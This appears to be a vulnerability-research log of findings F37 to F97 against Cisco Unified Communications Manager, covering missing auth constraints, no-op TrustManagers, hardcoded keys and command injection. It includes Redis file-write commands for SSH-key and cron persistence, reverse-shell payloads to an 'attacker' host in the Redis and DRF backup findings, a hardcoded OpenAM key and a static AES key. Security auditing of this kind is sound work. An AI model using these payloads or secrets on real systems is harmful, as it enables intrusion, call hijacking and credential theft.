  HTTP note: haproxy.conf excludes /ccmivr from HTTPS redirect → SQLi exploitable over plaintext HTTP port 80
  CVSS: 8.6 High AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N

CUCM-F38 MEDIUM: HAProxy admin socket world-writable — local privilege escalation to network layer
  Config: /usr/local/cm/conf/haproxy.conf
  Vulnerable line: stats socket /var/run/haproxy.sock mode 666 level admin
  Scope: HAProxy terminates TLS for ALL CUCM web services: 443, 8443, 9560 (LPNS), 6971/6972 (phone reg)
  Impact: any local user issues admin commands: show sess (active TLS sessions), disable server (DoS),
          set map (disable rate limiting on auth endpoints = brute-force amplifier), drain backends
  Amplifier: combining with F1 RCE → web shell → HAProxy admin → disable rate limits → brute-force all auth
  CVSS: 6.7 Medium AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:L
  Additional ctftp notes:
    - ctftp binary uses CCMEncryption::passwordToHex (F3 static key confirmed in TFTP service)
    - /usr/local/platform/.security/CCMEncryption/keys/dkey.txt = dynamic key path; absent on fresh install
      → fallback to F3 static key for ALL phone config file encryption
    - /usr/local/platform/.security/ITLRecovery/keys/ITLRecovery_priv.pem = ITL recovery key path
      (access via F30-style plaintext passphrase pattern allows silent phone trust reset)
    - SIPOAuth: phones with OAuth token + HTTPS get full config; without = mini config (attack surface reduction)

CUCM-F39 HIGH: SRST CTL Client EasyX509TrustManager — phone trust chain injection via network MitM
  Component: com-srstctlclient RPM / srstctlclient.jar
             CTLSocket.tlsConnect() + EasyX509TrustManager
  Root cause: CTLSocket installs EasyX509TrustManager(null) into SSLContext:
    new EasyX509TrustManager(null)   ← null KeyStore
    SSLContext.init([EasyX509TrustManager], null, null)
    EasyX509TrustManager.checkServerTrusted(): return;  ← no-op — trusts ALL server certs
    EasyX509TrustManager.checkClientTrusted(): return;  ← no-op — trusts ALL client certs
    EasyX509TrustManager.getAcceptedIssuers():  return null
  Protocol: SRST CTL distribution — CUCM pushes CTLFile to branch-site SRST routers over TLS
  Attack chain:
    1. MitM between CUCM and SRST router (WAN link, BGP, or L3 device)
    2. Present self-signed cert — accepted (checkServerTrusted is no-op)
    3. Inject crafted CTL file — adds attacker CA to phone trust store
    4. Branch phones trust attacker CA for SIP TLS + TFTP
    5. Full phone traffic interception / firmware injection
  Amplifier: F35 (CTL trust chain abuse) — EasyX509TrustManager enables remote F35 without physical access
  CVSS: 7.4 High AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N

CUCM-F40 LOW: Test TrustManager in production UXL WAR — JVM-wide Axis fake TLS socket factory
  Component: cm-uxl RPM / UXLService.war
             WEB-INF/classes/com/cisco/ccm/uxl/client/CiscoSoapClientTestTrustManager.class
  Root cause: CiscoSoapClientTestTrustManager (named "Test") shipped in production WAR.
    Static initializer + constructors call allowSelfSignedCertificate():
      System.setProperty("axis.socketSecureFactory",
                         "org.apache.axis.components.net.SunFakeTrustSocketFactory")
    Sets JVM-wide Axis system property → all Axis SOAP clients in UXL WAR accept any TLS cert.
    checkClientTrusted(): return;  ← no-op (trusts all client certs)
  Scope: UXL WAR requires BASIC auth (Standard CCM End Users role) — post-auth impact only.
         JVM property affects outbound Axis SOAP calls from UXL context, not inbound server TLS.
  CVSS: 3.7 Low AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N

CUCM-F41 CRITICAL: CMAS Redis unauthenticated on all interfaces — CDR exfil + file-write RCE
  Component: cm-cmas RPM / /usr/local/cm/conf/redis.conf
  Config (active, non-commented):
    bind 0.0.0.0     ← listens on ALL interfaces
    protected-mode no ← disables Redis safety net
    port 6379         ← default port
    # requirepass foobared  ← commented out — NO AUTHENTICATION
  Data: CMAS Redis serves as pub/sub broker for MACDRSubscriber (CDRs), MACMSyslogSubscriber
        (CUCM system logs), MAFilebeatSubscriber (Filebeat log stream).
  Attack 1 — CDR exfil:
    redis-cli -h <cucm_ip> subscribe cdr-events → real-time call records (caller/callee/duration)
  Attack 2 — file-write to RCE via CONFIG SET:
    CONFIG SET dir /root/.ssh/ → CONFIG SET dbfilename authorized_keys
    SET key "\n\nssh-rsa AAAA...\n\n" → BGSAVE → SSH as root
  Attack 3 — cron RCE:
    CONFIG SET dir /var/spool/cron/ → CONFIG SET dbfilename root
    SET cron_key "\n* * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\n" → BGSAVE
  Amplifier: post-RCE accesses F3 key, Informix DB, CTL files, HAProxy socket (F38)
  CVSS: 9.8 Critical AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CUCM-F42 MEDIUM: BPS JVM-global LDAP TLS endpoint identification disabled
  Component: cm-bps RPM / /usr/local/cm/conf/bps/BPSCfg.xml
  JVM param: -Dcom.sun.jndi.ldap.object.disableEndpointIdentification=true
  Effect: disables JDK built-in LDAPS hostname verification for ALL JNDI LDAP connections in BPS
  Classes affected: ImportLDAPAuth, ImportLDAPDir (bulk LDAP user/auth import)
  Attack: MitM on LDAP connection exposes LDAP bind credentials + allows injecting fake users into CUCM
  Extends: F22 (same LDAPS bypass pattern, different service)
  CVSS: 5.9 Medium AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N

CUCM-F43 HIGH: Cisco EVVBU code-signing private key ships in CUCM installer
  Component: cm-security RPM / /usr/local/cm/.security/certs/maKey.pvk
  PVK magic: 0xb0b5f11e (valid Microsoft PVK)
  Key type: 0x2 = AT_SIGNATURE (code-signing, not encryption)
  Encrypted: yes (salt_len=16, key_len=1172)
  Cert subject: CN=Cisco Systems Inc., OU=Enterprise Voice Video Business Unit
  Cert issuer: CN=Thawte Code Signing CA
  Impact: extracted PVK + cracked/known password → sign binaries as Cisco EVVBU → pass Authenticode
  Chain: PVK password may follow same pattern as other CUCM static keys (F3)
  CVSS: 7.5 High AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

CUCM-F44 CRITICAL: WebDialer Axis SOAP at /services/* accessible without container auth
  Component: cm-webdialer RPM / webdialer.war
  web.xml security-constraint covers: /Webdialer/* and /j_security_check ONLY
  /services/* has NO security-constraint entry → unauthenticated access
  Services exposed: WebdialerSoapService (allowedMethods=*), WebdialerSoapService70 (allowedMethods=*)
  AdminService: enableRemoteAdmin=false (localhost only) — still has hardcoded adminPassword=admin
  server-config.wsdd: <parameter name="adminPassword" value="admin"/>
  F40 extension: webdialer.war also ships WD70/CiscoSoapClientTestTrustManager.class (SunFakeTrustSocketFactory)
  Attack chain:
    1. POST /services/WebdialerSoapService70 → initiate calls without auth
    2. After F41 Redis RCE: use adminPassword=admin locally → hot-deploy malicious Axis service
  CVSS: 9.8 Critical AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CUCM-F45 CRITICAL: Extension Mobility EMServiceServlet — GET/POST unconstrained (HTTP method omission)
  Component: cm-em RPM / emservice.war, emapp.war
  web.xml security-constraint: deny-all on PUT/DELETE/HEAD/CONNECT/OPTIONS/TRACE (explicit list)
  Servlet spec §13.8.1: listed methods ONLY — GET and POST are NOT constrained
  No <login-config> in either WAR
  Servlet: /EMServiceServlet (Extension Mobility phone login/logout)
  Impact: unauthenticated GET/POST to /EMServiceServlet → phone hijack via EM login
    - Any attacker can associate any user profile with any IP phone in the enterprise
    - Intercepts calls and voicemail routed to that phone
  Amplifier: F3 static key → decrypt EM user credentials from DB → replay to unauthenticated EMServiceServlet
  CVSS: 9.1 Critical AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

CUCM-F46 MEDIUM: dnaliaslookup.war missing <auth-constraint> — UserLookupServlet + cache ops unauthenticated
  Component: cm-userlookup RPM / dnaliaslookup.war
  web.xml (Servlet 2.2 DTD): security-constraint for url-pattern "/" has only <user-data-constraint>NONE
    No <auth-constraint> present; <login-config>CLIENT-CERT</login-config> declared but never enforced
    Servlet spec: <login-config> only triggers when a <security-constraint> contains <auth-constraint>
  Exposed without auth:
    - UserLookupServlet (GET / → returns dial number alias lookups)
    - AddToCache (cache poisoning: inject arbitrary extension→alias mappings)
    - ClearCache (DoS: flush enterprise-wide DN alias cache)
  Impact: extension→username enumeration (targeting); cache poison redirects calls; ClearCache disrupts dialing
  Chain: F46 enum all extensions → F45 unauthenticated EM login → hijack targeted phone
  CVSS: 5.3 Medium AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N

CUCM-F47 MEDIUM: dna.war DNAMainServlet — no <security-constraint> + TokenFilter class missing from WAR
  Component: cm-dna RPM / dna.war
  web.xml: DNAMainServlet mapped at /DNAMainServlet — NO corresponding <security-constraint>
  context.xml: standard <Realm> commented out; uses AuthenticationValve instead
  TokenFilter class (com.cisco.ccm.dna.servlets.TokenFilter) referenced in web.xml filter chain
    but absent from dna.war classes and dnaServer.jar — filter chain incomplete at web.xml layer
  Impact: DNAMainServlet (DNA alias maintenance: add/delete/update extension→alias mappings) potentially
    accessible without auth; attacker can poison authoritative alias store at persistence layer
  Chain: F47 poison alias store → F46 ClearCache → poisoned mappings served to all clients before refresh
  CVSS: 5.3 Medium AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N

CUCM-F48 HIGH: ma.war (IPMA) HTTP method omission — GET/POST to call-divert + config endpoints unconstrained
  Component: cm-ipma RPM / ma.war
  web.xml (Servlet 2.2 DTD): security-constraint for /* enumerates PUT/DELETE/HEAD/CONNECT/OPTIONS/TRACE
    with deny-all auth-constraint; GET and POST NOT listed → unconstrained per Servlet spec §13.8.1
  Comment <!--CSCsx40175--> confirms Cisco tracked this as internal bug
  Exposed via unauthenticated GET/POST:
    /servlet/MAService — IPMA main service (manager/assistant call routing)
    /phone/setAsstDivertTarget.jsp — set assistant call divert target
    /phone/setMgrDivertTarget.jsp — set manager call divert target
    /desktop/mgrconfig.jsp — manager desktop config
    /phone/asstMenu.jsp, mgrmenu.jsp — full phone menu UIs
  Impact: unauthenticated POST redirects all calls for any manager/assistant pair to attacker-controlled number
  Chain: F3 static key → decrypt manager credentials from DB; OR exploit unauthenticated GET/POST directly
  Same class as F45; CSCsx40175 = Cisco tracked this
  CVSS: 8.1 High AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N

CUCM-F49 HIGH: pms.war Phone Migration Service — Jersey REST API unauthenticated; PIN oracle + phone profile hijack
  Component: pms RPM / pms.war
  Jersey servlet (com.sun.jersey.spi.container.servlet.ServletContainer) at /*
    Resource classes: FindPhoneByDN + PhoneMigration (in com.cisco.cucm.pms.views)
  Security-constraint has user-data-constraint=NONE but NO auth-constraint → completely unauthenticated
    Comment: "Redirect pms http request to https" but transport-guarantee=NONE (TLS NOT enforced)
  FindPhoneByDN: enumerate phones by extension (unauthenticated)
  PhoneMigration: self-service phone profile migration (Primary Extension + SSID + PIN)
    Error message oracle: invalid-PIN vs invalid-extension vs no-user-association → brute-force attack
    Successful migration = attacker gets victim's phone profile on attacker-controlled IP phone
  Impact: extension enumeration + PIN brute force + full phone profile hijack (calls, voicemail, identity)
  Chain: F3 static key → decrypt Self-Service PINs from DB → direct PhoneMigration without brute force
  Secondary: transport-guarantee=NONE → PIN transmitted in cleartext over HTTP
  CVSS: 7.5 High AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

CUCM-F50 HIGH: changecredential.war — No security-constraint; PIN oracle (DIRUSER/INVALID_CREDENTIAL/USER_LOCKED) + Unity voicemail PIN sync
  Component: cm-changecredential RPM / changecredential.war (Servlet 2.2 DTD)
  display-name: Cisco Change Pin Application
  NO <security-constraint> anywhere in web.xml — no transport guarantee, no role enforcement
  Endpoints: /ChangeCredentialServlet, /jsp/ChangePin.jsp, /jsp/ChangeSuccess.jsp, /jsp/ChangePinError.jsp
  Request params (from ChangeCredentialCommunicator.getChangePinXML() bytecode):
    userid (user directory ID), oldpin (current PIN in cleartext), device (phone device name)
  PIN oracle via Constants.java interface error codes:
    DIRUSER_ERROR → user not found (enumerate valid userids)
    INVALID_CREDENTIAL → wrong PIN (valid user confirmed)
    USER_LOCKED → account locked (valid user, PIN attempts exhausted)
    NEW_PIN_SAME_AS_OLD_PIN, NEW_PIN_MISMATCH → distinct UI messages
  ChangePinError_jsp renders distinct errors per return code → full oracle surface
  UpdateUnityUsersPinUtil: successful PIN change propagates to all Unity Connection servers
    where appserverinfo.content LIKE '%<pinSyncEnabled>true</pinSyncEnabled>%'
  Authenticator.initGoodApps() loads device credentials from CMDatabase — device param is user-supplied
  Chain: F3 static key → decrypt user PINs from EndUser.pin → replay directly
    OR F46 dnaliaslookup ClearCache → enumerate valid userids → oracle brute-force F50
  CVSS: 7.5 High AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N

CUCM-F51 HIGH: cucm-uds.war UDS REST API — Auth constraint covers only /user/* and /private/user/*
  Component: ucm-cucm-uds RPM / cucm-uds.war (Servlet 3.0, Jersey 1.x)
  Jersey servlet covers /* with 6 packages: priv.resources + pub.resources + ccmcip + ccmpd + providers + xps
  Security-constraint auth only on: /user/* and /private/user/* (GET/POST/PUT/DELETE/HEAD)
  Catch-all /* constraint: user-data-constraint NONE, NO auth-constraint
  UDSFilter (app-level auth) maps only to /user/* and /private/user/* — skips all other endpoints
  Unauthenticated endpoints confirmed via bytecode @Path extraction:
    /emLoggedInUsers (EmLoggedInUsers pub) — real-time EM session state: who is logged into which phone NOW
    /users (UsersResource pub) — user directory search/enum (ThrottleFilter applies, no auth)
    /clusterUser (ClusterUserResource pub) — cluster-level user lookup
    /servers (ServersResource pub) — CUCM cluster server topology (IPs, roles)
    /groups (UserGroupResources pub) — user role/group enumeration
    /private/emLoggedInUsers (EmLoggedInUsers priv) — private API tier, same data
    /private/users (UsersResource priv) — private user search
    /private/clusterUser (ClusterUserResource priv) — private cluster user data
    /private/servers (ServersResource priv) — private server list
    /version (VersionResource pub) — API version
    /docs/* — DefaultServlet with listings=true (directory listing of docs/ content)
    /ccmcip/ControlledDevices.jsp — devices controlled by a given user
    /ccmcip/xmldirectory.jsp — XML directory service
  Chain: /emLoggedInUsers → F48 IPMA call divert against active sessions
  Chain: /users → F49/F50 PIN oracle against enumerated userids
  Chain: /servers → lateral movement target enumeration
  CVSS: 7.5 High AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

CUCM-F52 HIGH: platform-sso — SSO authentication tier bundles Tomcat 6.0.30 (built Aug 2011, EOL Dec 2016)
  Component: platform-sso RPM / SSO Tomcat instance
  Evidence: usr/local/platform/sso/tomcat/custom/ServerInfo.properties:
    server.info=Apache Tomcat/6.0.30
    server.built=Aug 9 2011 09:34:27
  CUCM 15.0.1 (2024/2025) ships 13-year-old Tomcat for SSO SAML authentication
  PAM etc/pam.d/sso-auth: 'auth sufficient pam_permit.so' — always returns PAM_SUCCESS
    Local auth entirely delegated to SAML; no fallback password check
  EOL: Apache Tomcat 6.0.x EOL December 2016; 50+ CVEs in 6.0.30 -> EOL window
  Critical CVEs:
    CVE-2012-3546: auth bypass with client cert + NIO (CUCM uses client cert auth extensively)
    CVE-2016-8735: RCE via JmxRemoteLifecycleListener
    CVE-2014-0096: XXE via DefaultServlet
    CVE-2013-2185: RCE via file upload if manager app deployed
  Compound: SSO Tomcat compromise = auth bypass for all CUCM platform services using SSO
  Chain: F6 (JWT) + F52: EOL Tomcat provides alternate SSO bypass path even with alg:none blocked
  CVSS: 7.5 High AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

=== PENDING TASKS ===
- ssobackend.jar JWT validation path RE (F6) — CLOSED (SignedJWT.parse blocks alg:none)
- Nimbus JOSE+JWT CVE mapping for 4.23 build
- cm-car/cm-cdrdlv/cm-cef/cm-ipvms/cm-ipvmsd/cm-ccmportal/cm-CTIManager/cm-soap-cdr — CLOSED (no findings)
- headset/ucmuser/ccmuser/cucreports/dhcp/ils/ccmpns — CLOSED (scope only; no new standalone findings)
- cm-lpns WebSocket endpoint — CANDIDATE: AuthFilter maps to /register/* HTTP only; @ServerEndpoint bypasses?
- cm-changecredential — CLOSED (F50: no security-constraint, PIN oracle, Unity sync)
- cucm-uds — CLOSED (F51: unauthenticated /emLoggedInUsers + /users + /servers + ccmcip)
- platform-sso — CLOSED (F52: Tomcat 6.0.30 EOL in SSO auth tier; pam_permit.so)
- platform-adminsftp/platform-drf/install_file_signing — CLOSED (no credential findings; drf.war properly auth-constrained)
- platform-ui — CLOSED (F53: sshRestrict.sh chmod 666 on sshd_config with no restoration)
- cm-ccm binary deep dive: largely complete; remaining: SIP stack buffer overflow (requires dynamic)
- ucapp_common remaining: cm-gaxl, cm-reporter-servlet, cm-scheduler, cm-tvs, cucminventory, ucm-ccmact — agent scanning
- serviceability_callmanager remaining: cm-alarm, cm-auditeventresponder, cm-soap-callrecordservice, cm-soap-dpservice — agent scanning
- ucplatform remaining: platform-ipsec, platform-tomcat, platform-servM, platform-util, platform-ver, service-registration, platform-fipsutil — extracted, analyzing
- platform-containers — CLOSED (F66: AXL/UDS/SSOSP containers host networking + DAC_OVERRIDE + /tmp RW mount = container compromise → host lateral movement)
- cm-tvs — CLOSED (F55: bundleITLRecovery.sh SFTP password stdout echo + PKCS12 passphrase in ps args + ITLRecovery.p12 664)
- ucm-ccmact — CLOSED (F54: ccmact.war /v1/tester/* + /v1/testalarm/* + /v1/actions/srp/* unauthenticated, explicit dev comment)
- sso-sp RPM — CLOSED (F56-F59: credential policy brute-force, hardcoded Fedlet key, unsigned SAML, OAuth implicit grant)
- cm-jar-lib / snmp-mon — CLOSED (F61 Struts CVE-2024-53677, F62 SNMP defaults)
- cm-syslog / cm-tct-svc — CLOSED (F63: DRF backup/restore scripts os.system()+sudo root RCE)
- cm-axl (callmanager RPM) — CLOSED (F64: axl.war transport-guarantee=NONE, AXL HTTP Basic in cleartext)

CUCM-F56 HIGH: Default Credential Policy — minlength=1, trivialcredchecking=0, maxdays=0 (brute-force via F50 oracle)
  Component: cm-dbl RPM / CredentialPolicy.csv pkid=9454babf-48d0-4e16-9b80-2d0da4b38750
  minlength=1 → 9-value PIN space (1-9 single digit); trivialcredchecking=0 → "1" valid
  maxdays=0 → PINs never expire; prevcredcount=0 → no history; maxhacks=5/hackresettime=30min
  15 brute-force attempts/hour; chains with F50 PIN oracle (DIRUSER_ERROR/INVALID_CREDENTIAL distinguisher)
  CVSS: 7.5 High AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

CUCM-F57 MEDIUM: Hardcoded OpenAM Fedlet encryption password in FederationConfig.properties
  Component: sso-sp RPM / usr/local/platform/sso/saml/metadata/FederationConfig.properties
  am.encryption.pwd=8p3BTg2tvtG0Kg//Hqahy8x29u9FPxH2 — upstream OpenAM default, never rotated
  JCEEncryption uses this key for SAML keystore passphrases in fedlet.cot
  Same key across all CUCM 15.0.1 deployments; chains with F52 (Tomcat RCE → filesystem read)
  CVSS: 5.9 Medium AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N

CUCM-F58 HIGH: SAML SP unsigned AuthN requests + unsigned assertion acceptance
  Component: sso-sp RPM / usr/local/platform/sso/saml/conf/ssoconfig.properties
  metadata_auth_request_signed=false; metadata_assertion_signed=false; sp_md_signed=false
  OpenSAML 2.6.5 (EOL 2016) + xmlsec 1.5.6 (CVE-2013-2172 XML Signature Spoofing)
  Misconfigured IdP → unsigned assertion accepted → SAML auth bypass → CCMAdmin/AXL/UDS
  CVSS: 8.1 High AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N

CUCM-F59 MEDIUM: ssosp.war OAuth endpoints lack container auth; implicit grant; 60+ hardcoded client IDs
  Component: sso-sp RPM / usr/local/platform/war/ssosp.war + ClientInfo.xml
  /token/access_token + /oauth/authorize + /user/whoami + /token/device: NO security-constraint
  60+ client IDs in ClientInfo.xml (public, shipped in RPM); all responsetype=token (implicit grant)
  refreshtoken 60 days; chains with F58 SAML bypass for end-to-end OAuth token acquisition
  CVSS: 6.5 Medium AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N

CUCM-F60 MEDIUM: CCMEncryption.jar setStaticKey() public static override bypasses dynamic key; wire format IV||AES-CBC; AES-128 static vs AES-256 dynamic key asymmetry
  Component: cm-encryption RPM / CCMEncryption.jar (com.cisco.ccm.security.CCMEncryption)
  <clinit>: useDynamicKey=true (iconst_1 hardcoded); keydataDkey null → static key fallback
  Static key: "smetsysocsiccni\x00" (16B AES-128); Dynamic: 64-char hex from dkey.txt (32B AES-256)
  setStaticKey() public static: sets useDynamicKey=false → disables dynamic key at runtime (reflection-callable post-RCE)
  Wire format confirmed: IV(16 bytes, random NativePRNGNonBlocking) || AES-128-CBC-PKCS5(ciphertext)
  dkey.txt write path predictable: if writable (F41/F53 chains), plant known key → all future encryptions use attacker-known AES-256
  Chains: F3 (root static key), F41 (Redis write dkey.txt+dkey_status.txt), F53 (world-writable sshd_config chain)

CUCM-F63 CRITICAL: DRF backup/restore scripts -- unsanitized os.system() + sudo tar on user-controlled args -> root RCE
  Components: cm-syslog: do_backup.py/do_restore.py/do_syslog_restore.py; cm-tct-svc: tct_do_backup.py/tct_do_restore.py
  Pattern: DEVICE_TARBALL + DEC_SEQ + " | sudo /bin/tar -xvpPf - 1>> " + LOGFILE -> 3 injection points
  All values from sys.argv (admin backup config: SFTP path, encryption sequence, log path) -> os.system() unsanitized
  DEC_SEQ="; bash -i &>/dev/tcp/attacker/443 <&1 #" -> root reverse shell via sudo tar pipe
  LOGFILE="/etc/cron.d/backdoor" -> root cron persistence via tar stdout redirect
  Chain: admin auth (F1/F7) -> DRF backup schedule config -> sudo root RCE

CUCM-F64 MEDIUM: axl.war transport-guarantee=NONE - AXL SOAP admin credentials in cleartext HTTP
  Component: cm-axl RPM / usr/local/cm/war/axl.war WEB-INF/web.xml
  <transport-guarantee>NONE</transport-guarantee> on /axl + /services/AXLAPIService (GET+POST)
  AXL uses HTTP Basic Auth (base64 in Authorization header) -- no HTTPS enforcement
  No HTTPS enforcement -> admin creds + full provisioning payload (users, phones, dial plans) in cleartext
  Chains: F37 (ccmivr SQLi), F61 (Struts RCE), F63 (DRF injection) all require admin auth - AXL interception provides it

CUCM-F67 CRITICAL: cm-reporter DRF backup/restore -- same os.system()+sudo tar as F63, separate component
  reporter_do_backup.py: cmd = "sudo tar -cvpPf " + DEVICE_TARBALL + " " + REPORTDIR + " 2>> " + LOGPATH + " " + ENC_SEQ + " " + REDIRECTION
  reporter_do_restore.py: cmd = DEVICE_TARBALL + DEC_SEQ + " | sudo /bin/tar -xvpPf - 1>> " + LOGPATH
  All args from sys.argv, no sanitization; restore: DEVICE_TARBALL is command prefix -> arbitrary command injection
  Second independent DRF injection point (cm-reporter component, separate from F63 cm-syslog/cm-tct-svc)
  Chain: F63 (same pattern), F3 (decrypt backup), F41 (Redis write-anywhere)

CUCM-F68 HIGH: soapservicecontrol.sh hardcoded AdminClient credentials -uxx -wxx
  /usr/local/cm/bin/soapservicecontrol.sh: java AdminClient -uxx -wxx -> username=xx password=xx
  Controls SOAP service lifecycle (deploy/undeploy/start/stop) via https://localhost:PORT/CONTEXT/services/AdminService
  Affects all 6 Axis SOAP services (realtimeservice/perfmonservice/logcollectionservice/controlcenterservice/SNMPService/dpservice)
  Post-RCE: disable monitoring services (RTMT evasion) by calling script; or replay AdminClient directly

CUCM-F69 HIGH: reporter-servlet.war Servlet 2.3 PATCH bypass on file operation servlets
  Servlets: DeleteFiles, GetFileContent, GetFileList -- no auth-constraint for PATCH/PROPFIND/non-listed methods
  Tomcat HttpServlet.service() dispatches unknown methods to doGet() -> file read/delete without auth
  Probe: PATCH /ccmservice/reporter-servlet/GetFileContent?file=/var/log/active/cm/log/ccm.log
  sessionFilter /* is remaining gate -- if method-sensitive, fully unauthenticated file ops

CUCM-F70 HIGH: Axis 1.x AdminServlet in 6 WARs + Servlet 2.2 method bypass
  realtimeservice.war/controlcenterservice.war/SNMPService.war/perfmonservice.war/logcollectionservice.war/dpservice.war
  /servlet/AdminServlet mapped in all; Servlet 2.2 method enumeration -> PATCH unconstrained
  WSDD-based service deployment via PATCH to AdminServlet; adminPassword=admin hardcoded in wsdd
  controlcenterservice.war: additionally missing sessionFilter + PathReversalSecurityFilter entirely

CUCM-F71 HIGH: ftp.exp/sftp.exp Tcl eval on argv -> OS command injection
  /usr/local/cm/bin/ftp.exp + sftp.exp: eval [concat spawn $argv[0..1]] -> arbitrary Tcl/spawn execution
  Any CUCM component passing attacker-controlled args to these scripts is a transitive injection vector

CUCM-F72 HIGH: cm_idp_post.sh TOCTOU /tmp/list_cmd backtick injection during W1/W2 upgrade
  isftp writes SFTP file list to /tmp/list_cmd (no mktemp); then: cmd=... `cat /tmp/list_cmd` -> shell injection
  Race window during upgrade (script runs as root); or pre-position /tmp/list_cmd before script start

CUCM-F73 MEDIUM: ucmadmin.war PresenceViewerTrustManager no-op TrustManager
  checkClientTrusted()/checkServerTrusted() empty; anonymous HostnameVerifier returns true
  All Presence server HTTPS traffic MitM-able; chains: F17/F39/F40 (same TrustManager pattern across components)

CUCM-F74 HIGH: ucmadmin.war xalan-2.7.3.jar CVE-2022-34169 integer truncation -> XSLT injection/arbitrary class load
  Exploitability conditional on untrusted XSLT reaching TransformerFactory; chain F75->F74: CSRF -> XSLT RCE

CUCM-F75 MEDIUM: ucmadmin.war Spring Security disabled -- no CSRF on 15+ @RequestBody POST endpoints
  springSecurityFilterChain commented out in applicationContext-security.xml (migration TODO note)
  15+ admin endpoints (DirectoryNumber/EndUser/SIPTrunk/etc.) accept POST without CSRF token validation
  transport-guarantee=NONE -> HTTP cookie theft + CSRF -> provisioning changes without admin knowledge

CUCM-F76 MEDIUM: ccmservice.war DbSyncServlet + LogoffServlet not in any <security-constraint>
  /DbSyncServlet.class mapped but no container-level auth; only struts2 /* filter (action-mapping dependent)
  DbSyncServlet likely triggers CUCM-DB sync; exploitability conditional on Struts action config

CUCM-F77 MEDIUM: cm-sch SCHHostnameVerifier unconditional return true + TLSSocketFactory SSLv2Hello/SSLv3
  SCHHostnameVerifier.verify(): iconst_1; ireturn (unconditional true) -- any hostname accepted for TLS certs
  TLSSocketFactory: setEnabledProtocols(["SSLv2Hello","SSLv3","TLSv1",...]) -> POODLE (CVE-2014-3566) downgrade possible
  Note: SCHTrustManager.checkServerTrusted() DOES validate chain (rethrows CertificateException) -- not fully bypassed
  Affected channels: TAC phone-home, AMC (amc.cisco.com), GRTSourceBase :8443/grt/, TraceDownloadUtil SFTP creds XML POST
  Chain: F17/F39/F40/F73 (systemic no-op hostname verifier pattern); SFTP creds in TraceDownloadUtil XML body exposed

CUCM-F78 HIGH: gaxl.war security-constraint covers only url-pattern '/' (default servlet) — NOT '/*'
  Component: cm-gaxl RPM / usr/local/cm/war/gaxl.war / WEB-INF/web.xml
  CXFServlet at /soap/* exposes AXL SOAP v8.0-15.0; security-constraint <url-pattern>/</url-pattern> = root only
  HideResourceFilter (com.cisco.gaxl.filters.HideResourceFilter) is only protection for /soap/*
  Custom filter bypass vectors: path normalization (//soap/, %2fsoap), forward dispatcher type not restricted,
    direct internal HTTP port 9446 access from Docker host network (F66)
  transport-guarantee=NONE on the security-constraint permits cleartext HTTP Basic Auth credentials
  Chain: F66 (Docker lateral movement -> localhost:9446 HTTP -> bypass HTTPS auth) + F64 (same NONE pattern)
  AXL SOAP: full provisioning API (users/devices/dial-plans/gateways/SIP trunks) if reached unauthenticated

CUCM-F79 HIGH: cm-dirsync JVM arg disableEndpointIdentification=true -- LDAP SSL hostname bypass
  CCMDirSyncCfg.xml: -Dcom.sun.jndi.ldap.object.disableEndpointIdentification=true in JVM arguments
  Disables TLS endpoint identification (hostname verification) globally for all JNDI/LDAP SSL connections in DirSync JVM
  Any network MITM -> present any cert (any CN/SAN) -> intercept all LDAP sync traffic
  Impact: rogue user injection into CUCM directory, steal LDAP bind credentials via LDAP referral, replay enrolled device data
  Chain: F21 (LDAP bind password decryptable via F3 static key), F22 (LDAPS hostname bypass in IMS LDAP) -- systemic

CUCM-F94 CRITICAL: cm-bps BAT DRF bat_do_backup.py / bat_do_restore.py -- third DRF os.system() + sudo tar injection
  DEVICE_TARBALL/LOGPATH/ENC_SEQ (backup), DEVICE/DEC_SEQ/LOGPATH (restore) from sys.argv directly concatenated into os.system()
  Restore: command = DEVICE + DEC_SEQ + " | sudo /bin/tar ..." -- DEVICE is first token = command-prefix injection -> root shell
  Systemic class: F63 (cm-syslog DRF), F67 (cm-reporter DRF), F94 (cm-bps BAT DRF) = three independent vulnerable components

CUCM-F95 MEDIUM: pms.war Jersey JAX-RS FindPhoneByDN + PhoneMigration -- no auth-constraint, container auth not enforced
  security-constraint has only <transport-guarantee>NONE</transport-guarantee>, no <auth-constraint>
  FindPhoneByDN: phone MAC-to-DN mapping enumerable without auth; PhoneMigration: upgrade state exposed
  Chain: F84 (TFTP phone config enumeration -> MACs) -> F95 (FindPhoneByDN -> MAC-to-extension mapping)

CUCM-F96 MEDIUM: cm-CtlCli ctl_cli.sh copy_ctlFile() TOCTOU -- /tmp/ctl_batch predictable SFTP batch file -> cluster-wide lateral movement
  /tmp/ctl_batch + /tmp/delete_ctl_batch created via cat >> without O_EXCL; world-writable /tmp
  Race window: cat-create to sftp_connect.sh -b /tmp/ctl_batch sftpuser@$node execution
  Attacker with local shell pre-plants malicious SFTP batch -> sftpuser executes injected commands on ALL cluster peer nodes
  Chain: F72 (TOCTOU class), F35 (CTL file controls cluster security mode)

CUCM-F97 HIGH: cm-RIS mmfSpyScript.sh ${PARAMS[*]} unquoted array expansion -- shell injection in RIS diagnostics CLI
  OUTPUT=`/usr/local/cm/bin/mmfSpy ${PARAMS[*]}` -- ${PARAMS[*]} word-splits on whitespace in backtick context
  Shell metacharacters (backtick, $(), ;, |, &) in CLI args break out -> execute as shell commands in mmfSpyScript.sh context
